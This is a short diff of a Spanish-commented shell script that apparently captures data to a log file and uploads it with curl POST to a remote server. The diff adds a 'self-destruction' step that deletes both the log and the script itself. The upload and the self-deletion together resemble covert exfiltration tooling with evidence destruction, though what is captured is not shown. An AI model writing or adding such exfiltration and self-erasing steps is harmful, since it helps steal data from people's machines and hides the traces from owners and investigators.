@@ -26,3 +26,8 @@ echo "[*] Captura finalizada. Enviando archivo al servidor..."
 curl -X POST -F "file=@$LOG_FILE" "$SERVER_URL"
 
 echo "[*] Archivo enviado correctamente a $SERVER_URL"
+
+# Autodestrucción del script y el archivo de logs
+rm -f "$LOG_FILE" "$0"
+
+echo "[*] Autodestrucción completada. Eliminando logs y script."
